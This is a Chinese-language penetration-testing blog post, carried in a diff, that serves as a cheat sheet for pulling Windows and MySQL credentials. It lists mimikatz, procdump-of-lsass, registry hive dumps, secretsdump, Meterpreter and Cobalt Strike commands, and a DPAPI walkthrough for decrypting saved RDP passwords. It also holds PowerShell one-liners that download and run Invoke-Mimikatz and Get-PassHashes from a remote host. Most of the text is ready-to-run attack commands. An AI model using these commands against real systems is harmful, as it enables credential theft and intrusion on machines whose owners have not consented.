+    <title>Windows密码凭证获取</title>
+    <url>/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
+    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Windows-Hash简介"><a href="#0x00-Windows-Hash简介" class="headerlink" title="0x00  Windows Hash简介"></a>0x00  Windows Hash简介</h3><h4 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h4><p>所谓哈希（hash），就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一 次数学加密函数运算，然后返回一个固定长度的字符串。 现在已经有了更新的NTLMv2以及Kerberos验证体系。</p>
+<p>Windows系统使用两种方法对用户的密码进行哈希处理，它们分别是LAN Manager（LM）哈希和NT LAN Manager（NTLM）哈希Windows加密过的密码口令，我们称之为hash，Windows的系统密码hash默认情况下一般由两部分组成：第一 部分是LM-hash，第二部分是NTLM-hash。</p>
+<span id="more"></span>
+
+<p>Windows Hash格式：</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">用户名称<span class="symbol">:RID</span><span class="symbol">:LM-HASH</span>值<span class="symbol">:NT-HASH</span>值</span><br></pre></td></tr></table></figure>
+
+<p>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>2000</th>
+<th>xp</th>
+<th>2003</th>
+<th>Vista</th>
+<th>win7</th>
+<th>2008</th>
+<th>2012</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LM</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>NTLM</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+</tbody></table>
+<h4 id="Windows-认证基础"><a href="#Windows-认证基础" class="headerlink" title="Windows 认证基础"></a>Windows 认证基础</h4><p>Windows的认证包括三个部分： </p>
+<ul>
+<li><p>本地认证：用户直接操作计算机登陆账户 </p>
+</li>
+<li><p>网络认证：远程连接到工作组中的某个设备 </p>
+</li>
+<li><p>域认证：登陆到域环境中的某个设备</p>
+</li>
+</ul>
+<h4 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h4><ul>
+<li><p>用户输入密码 </p>
+</li>
+<li><p>系统收到密码后将用户输入的密码计算成NTLM Hash </p>
+</li>
+<li><p>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对 </p>
+</li>
+<li><p>匹配则登陆成功，不匹配则登陆失败</p>
+</li>
+</ul>
+<p>本地认证中用来处理用户输入密码的进程为lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p>
+<h3 id="0x01-系统用户密码凭证获取"><a href="#0x01-系统用户密码凭证获取" class="headerlink" title="0x01 系统用户密码凭证获取"></a>0x01 系统用户密码凭证获取</h3><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
+<p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+</blockquote>
+<h6 id="本地交互式"><a href="#本地交互式" class="headerlink" title="本地交互式"></a>本地交互式</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log res.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="本地非交互式凭证获取"><a href="#本地非交互式凭证获取" class="headerlink" title="本地非交互式凭证获取"></a>本地非交互式凭证获取</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log logon.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Powershell远程加载mimikatz脚本"><a href="#Powershell远程加载mimikatz脚本" class="headerlink" title="Powershell远程加载mimikatz脚本"></a>Powershell远程加载mimikatz脚本</h6><blockquote>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://ip:prot/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure>
+
+<h6 id="Powershell加载Get-PassHashes脚本"><a href="#Powershell加载Get-PassHashes脚本" class="headerlink" title="Powershell加载Get-PassHashes脚本"></a>Powershell加载Get-PassHashes脚本</h6><blockquote>
+<p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.x.x.<span class="number">85</span>/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>
+
+<h4 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">官网地址：https:<span class="regexp">//</span>www.ampliasecurity.com/research.html</span><br><span class="line"><span class="number">32</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x32.zip</span><br><span class="line"><span class="number">64</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x64.zip</span><br><span class="line">历史版本下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>windows-credentials-editor/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.jpg"></p>
+<h4 id="Pwddump7"><a href="#Pwddump7" class="headerlink" title="Pwddump7"></a>Pwddump7</h4><p>这款工具可以读取出当前系统的各个用户的密码hash (包括LM和NTLM)。 在命令行输入Pwddump7.txt就可以读取出hash并显示出来，也可以保存到一个文件中。</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Pwddump7</span>.</span></span>exe &gt; pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.jpg"></p>
+<h4 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h4><blockquote>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
+</blockquote>
+<p>Procdump lsass 进程导出: </p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">For</span> <span class="number">32</span>bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line"><span class="keyword">For</span> <span class="number">64</span>bits：</span><br><span class="line">procdump.exe -accepteula -<span class="number">64</span> -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p>然后使用mimikatz还原密码：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">full</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h4><blockquote>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure>
+
+<h6 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">system:system</span>.<span class="title">hiv</span> /<span class="title">sam:sam</span>.<span class="title">hiv</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+<h6 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
+
+<h4 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h4><blockquote>
+<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
+</blockquote>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.jpg"></p>
+<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h6 id="Hashdump"><a href="#Hashdump" class="headerlink" title="Hashdump"></a>Hashdump</h6><p>获取system权限</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">meterpreter</span> &gt; getsystem</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
+
+<p>获取hash值</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump		//system权限的meterpreter</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit						//结果保存在tmp目录下</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h6 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; <span class="built_in">help</span> kiwi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#列举系统中的明文密码</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">#读取sam文件</span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line">#kiwi_cmd命令后面接mimikatz.exe的命令</span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-Hash解密"><a href="#0x02-Hash解密" class="headerlink" title="0x02  Hash解密"></a>0x02  Hash解密</h3><blockquote>
+<p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
+</blockquote>
+<h6 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h6><p>如果网站无法破解出hash值，可以使用ophcrack工具配合彩虹表破解。 </p>
+<p>工具下载：<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a> </p>
+<p>彩虹表： <a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a> <a href="http://project-rainbowcrack.com/table.htm">http://project-rainbowcrack.com/table.htm</a></p>
+<h3 id="0x03-其他密码获取"><a href="#0x03-其他密码获取" class="headerlink" title="0x03  其他密码获取"></a>0x03  其他密码获取</h3><h4 id="获取RDP连接密码"><a href="#获取RDP连接密码" class="headerlink" title="获取RDP连接密码"></a>获取RDP连接密码</h4><h6 id="获取链接记录"><a href="#获取链接记录" class="headerlink" title="获取链接记录"></a>获取链接记录</h6><blockquote>
+<p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p>
+</blockquote>
+<h6 id="mimikatz解密"><a href="#mimikatz解密" class="headerlink" title="mimikatz解密"></a>mimikatz解密</h6><p>查看本地机器本地连接过的目标机器：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.jpg"></p>
+<p>查看本地用户此目录下是否存有RDP密码文件：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.jpg"></p>
+<p>查看保存在本地的远程主机信息：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+
+<p>选择一个密码文件对其进行解密：</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D</span><br></pre></td></tr></table></figure>
+
+<p>此处需要记录下<code>guidMasterKey</code>的值，待会要通过<code>guidMasterKey</code>找对应的<code>Masterkey</code>。</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">guidMasterKey : &#123;<span class="number">56</span>dc62ge-<span class="number">0</span>af9-<span class="number">4925</span>-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据guidMasterKey找到对应的Masterkey：</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
+
+<p>通过Masterkey解密pbData数据，拿到明文RDP连接密码：</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\2</span>A203AFB09B575A760E88FA341B9E354</span><br><span class="line">/masterkey:2d72835b9c08a9332106c23017ee6c0a0be9a368de34c1f6acc6d34dc0de8bc264729bd7736</span><br><span class="line">f806e9456544841564be0d5e9564090a7bb143ac32579adabb02a</span><br></pre></td></tr></table></figure>
+
+<h4 id="Mysql数据库密码破解"><a href="#Mysql数据库密码破解" class="headerlink" title="Mysql数据库密码破解"></a>Mysql数据库密码破解</h4><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问 数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。 </p>
+<p>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权 限后即可直接从数据库连接文件中读取 一般都包含有数据库类型，物理位置，用户名和密码等信息</p>
+<h5 id="MYSQL数据库文件类型"><a href="#MYSQL数据库文件类型" class="headerlink" title="MYSQL数据库文件类型"></a>MYSQL数据库文件类型</h5><p>MYSQL数据库文件共有“frm”、“MYD”“和MYI”三种文件</p>
+<ul>
+<li>“.frm” 是描述表结构的文件 </li>
+<li>“.MYD” 是表的数据文件 </li>
+<li>“.MYI” 是表数据文件中任何索引的数据树</li>
+</ul>
+<p>与用户相关的一共有三个文件即user.frm、user.MYD、user.MYI，MYSQL数据库用户密码都保存在user.MYD 文件中，包括root用户和其他用户的密码</p>
+<h5 id="MYSQL加密方式"><a href="#MYSQL加密方式" class="headerlink" title="MYSQL加密方式"></a>MYSQL加密方式</h5><p>MYSQL数据库的认证密码有两种方式：</p>
+<ul>
+<li>MYSQL 4.1版本之前是MYSQL323加密 </li>
+<li>MYSQL 4.1和之后的版本都是MYSQLSHA1加密</li>
+</ul>
+<p>MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询， 前者是MYSQL323加密，后者是MYSQLSHA1方式加密。 MYSQL323加密中生成的是16位字符串，而在MYSQLSHA1中生存的是41位字符串，其中*是不加入实际的密 码运算中，MYSQLSHA1加密的密码的实际位数是40位</p>
+<h5 id="获取MYSQL密码"><a href="#获取MYSQL密码" class="headerlink" title="获取MYSQL密码"></a>获取MYSQL密码</h5><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.jpg"></p>
+<h5 id="Hash破解"><a href="#Hash破解" class="headerlink" title="Hash破解"></a>Hash破解</h5><ul>
+<li><a href="http://www.cmd5.com/">www.cmd5.com</a> </li>
+<li><a href="http://www.somd5.com/">www.somd5.com</a></li>
+</ul>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h6 id="SharpDecryptPwd"><a href="#SharpDecryptPwd" class="headerlink" title="SharpDecryptPwd"></a>SharpDecryptPwd</h6><p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.jpg"></p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
